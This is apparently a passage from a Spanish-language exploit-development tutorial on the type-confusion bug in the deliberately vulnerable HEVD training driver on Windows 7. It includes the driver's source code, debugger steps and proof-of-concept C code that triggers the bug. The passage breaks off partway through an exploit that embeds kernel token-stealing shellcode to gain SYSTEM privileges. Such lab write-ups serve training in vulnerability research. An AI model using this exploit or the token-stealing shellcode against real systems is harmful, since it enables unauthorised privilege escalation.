+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">189</span> <span style="color:#960050;background-color:#1e0010">#</span>endif
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">190</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">191</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Freeing KernelTypeConfusionObject Object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">192</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Tag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(POOL_TAG));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">193</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelTypeConfusionObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">194</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">196</span>         <span style="color:#75715e">// Free the allocated Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">197</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">198</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">199</span>         <span style="color:#a6e22e">ExFreePoolWithTag</span>((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>         KernelTypeConfusionObject <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span>     <span style="color:#a6e22e">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetExceptionCode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">205</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Exception Code: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">206</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">206</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">207</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">208</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">209</span> }
+</span></span></code></pre></div><p>Como ocurre con todas las funciones grandes, analicemos esto pieza por pieza. Primero, asignamos un objeto <code>PKERNEL_TYPE_CONFUSION_OBJECT</code> en el <strong>NonPagedPool</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">131</span>         KernelTypeConfusionObject <span style="color:#f92672">=</span> (PKERNEL_TYPE_CONFUSION_OBJECT)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">132</span>             NonPagedPool,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">133</span>             <span style="color:#66d9ef">sizeof</span>(KERNEL_TYPE_CONFUSION_OBJECT),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">134</span>             (ULONG)POOL_TAG
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">135</span>         );
+</span></span></code></pre></div><p>A partir de ahí, suponiendo que todo salió bien, el conductor asigna los miembros <code>ObjectID</code> y <code>ObjectType</code> a la estructura <code>KernelTypeConfusionObject</code> que asignamos utilizando nuestra información.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">160</span>         KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectID <span style="color:#f92672">=</span> UserTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectID;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">161</span>         KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectType <span style="color:#f92672">=</span> UserTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectType;
+</span></span></code></pre></div><p>Luego llamamos a <code>TypeConfusionObjectInitializer</code> usando este objeto como el único parámetro.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">188</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">TypeConfusionObjectInitializer</span>(KernelTypeConfusionObject);
+</span></span></code></pre></div><p>Saltaremos esta función, sin embargo, el tipo devuelto es de <code>NTSTATUS</code>.</p>
+<p>Al finalizar este análisis de código, podemos ver que el objeto asignado se libera y luego se establece en NULL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">191</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Freeing KernelTypeConfusionObject Object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">192</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Tag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(POOL_TAG));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">193</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelTypeConfusionObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">194</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">196</span>         <span style="color:#75715e">// Free the allocated Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">197</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">198</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">199</span>         <span style="color:#a6e22e">ExFreePoolWithTag</span>((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>         KernelTypeConfusionObject <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span>     <span style="color:#66d9ef">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetExceptionCode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">205</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Exception Code: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">206</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">207</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">208</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">209</span> }
+</span></span></code></pre></div><p>Lo principal a tener en cuenta sobre esta función es que el miembro <code>Callback</code> nunca se establece. Es posible que podamos utilizar esto a nuestro favor&hellip;</p>
+<h2 id="typeconfusionobjectinitializer">TypeConfusionObjectInitializer</h2>
+<p>Para recapitular, <code>PKERNEL_TYPE_CONFUSION_OBJECT</code> se pasa a la función <em>TypeConfusionObjectInitializer</em> desde la función <em>TriggerTypeConfusion</em>.</p>
+<p>Podemos ver el código para <em>TypeConfusionObjectInitializer</em> abajo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">80</span> NTSTATUS
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">81</span> <span style="color:#a6e22e">TypeConfusionObjectInitializer</span>(
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">82</span>     _In_ PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">83</span> )   
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">84</span> {   
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">85</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">86</span>     
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span>     
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">89</span>     <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] KernelTypeConfusionObject-&gt;Callback: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>Callback);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">90</span>     <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Calling Callback</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">91</span>     
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">92</span>     KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Callback</span>();
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">93</span>     
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">94</span>     <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Kernel Type Confusion Object Initialized</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">95</span>     
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">96</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">97</span> }
+</span></span></code></pre></div><p>Interesante&hellip; parece que simplemente llamamos al miembro <code>Callback()</code>&hellip; Me pregunto si cuando escribimos en KernelTypeConfusionObject podríamos sobrescribir o más bien asignar a la memoria adyacente parte de nuestro buffer?</p>
+<h1 id="pruebas-dinámicas">Pruebas Dinámicas</h1>
+<p>En este punto sentí que tenía una comprensión sólida de cómo funciona esta función, así que decidí empezar a jugar con ella y observar el comportamiento.</p>
+<p>Desarrollé lo siguiente que sirviera como mi PoC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USER_TYPE_CONFUSION_OBJECT
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  ULONG_PTR ObjectID;
+</span></span><span style="display:flex;"><span>  ULONG_PTR ObjectType;
+</span></span><span style="display:flex;"><span>} USER_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PUSER_TYPE_CONFUSION_OBJECT;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  ULONG oId <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41414141</span>;
+</span></span><span style="display:flex;"><span>  ULONG oType <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42424242</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> oType;
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectID <span style="color:#f92672">=</span> oId;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  HEVD_IOCTL_TYPE_CONFUSION,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Exploit</span>(hHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Establezcamos un punto de interrupción justo cuando llamamos a la función <code>TypeConfusionInitializer</code> para ver qué se pasa a la función.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/breakpoint.png" alt="alt text"></p>
+<p>Una vez pegado, podemos ver que el puntero a nuestro objeto (almacenado en la parte superior de la stack) contiene un búfer de 16 bytes. Eso es aproximadamente 8 bytes más de lo esperado.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/bphit.png" alt="alt text"></p>
+<p>Si miramos esto desde la perspectiva de la estructura misma, solo debería tener 8 bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> gcc struct_size.c <span style="color:#f92672">-</span>m32
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#f92672">/</span>a.out
+</span></span><span style="display:flex;"><span>Sizeof USER_TYPE_CONFUSION_OBJECT   : <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>Sizeof KERNEL_TYPE_CONFUSION_OBJECT : <span style="color:#ae81ff">8</span>
+</span></span></code></pre></div><p>Pero espera, no debería la <code>KERNEL_TYPE_CONFUSION_OBJECT</code> tener 12 bytes &ldquo;<strong>(sizeof(ULONG_PTR) + sizeof(ULONG_PTR) + sizeof(FunctionPointer))</strong>&rdquo;?</p>
+<p>Después de buscar en Google, parece que el tamaño de una unión está determinado por el tamaño de su miembro más grande.</p>
+<p>Entonces esta asignación es de 8 bytes??</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>KernelTypeConfusionObject <span style="color:#f92672">=</span> (PKERNEL_TYPE_CONFUSION_OBJECT)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(
+</span></span><span style="display:flex;"><span>    NonPagedPool,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(KERNEL_TYPE_CONFUSION_OBJECT),
+</span></span><span style="display:flex;"><span>    (ULONG)POOL_TAG
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Ejecutémoslo nuevamente, esta vez estableciendo un punto de interrupción en la llamada a <code>ExAllocatePoolWithTag</code>.</p>
+<p>Interesante&hellip; como se esperaba, son 8 bytes&hellip;</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/intresting.png" alt="alt text"></p>
+<p>Ahora veamos qué se pasa a <code>TypeConfusionObjectInitializer</code>.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/hmm.png" alt="alt text"></p>
+<p>Esta vez no vemos más información de la esperada, pero podemos ver que la devolución de llamada es una dirección no válida.</p>
+<p>Si continuamos con el paso, eventualmente llegaremos a la llamada a la función de devolución de llamada. Una vez allí, podremos ver que en realidad estamos llamando a una dirección que no es válida.</p>
+<p>Más específicamente la información que enviamos.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/call.png" alt="alt text"></p>
+<p>Si damos un paso más, podemos ver que pudimos provocar corrupción de memoria.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/crash.png" alt="alt text"></p>
+<p>Sin embargo, ¡el kernel no falló! Si continúa la ejecución, notará que Windows continúa con su comportamiento normal. Es realmente importante saber esto desde la perspectiva del desarrollo de exploits: ¡no todas las vulnerabilidades desencadenarán un BSOD!</p>
+<p>Entonces, cómo sucedió esto? Dado que la Unión tiene un total de 4 bytes y nunca se inicializó, el Tipo de objeto ocupa el lugar del puntero de devolución de llamada.</p>
+<h1 id="explotación">Explotación</h1>
+<p>Dado que es Windows 7 (x86) y no tenemos que preocuparnos por las protecciones de memoria modernas, la explotación es tan simple como llamar a nuestro shellcode en el área de usuario.</p>
+<p>El PoC se puede ver hacia abajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Type Confusion */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USER_TYPE_CONFUSION_OBJECT
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  ULONG_PTR ObjectID;
+</span></span><span style="display:flex;"><span>  ULONG_PTR ObjectType;
+</span></span><span style="display:flex;"><span>} USER_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PUSER_TYPE_CONFUSION_OBJECT;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Type Confusion */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  LPVOID lpvMemoryAllocation <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> shellcode[]<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* sickle-tool -p windows/x86/kernel_token_stealer -f c -m pinpoint */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">// pushal
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// xor eax, eax
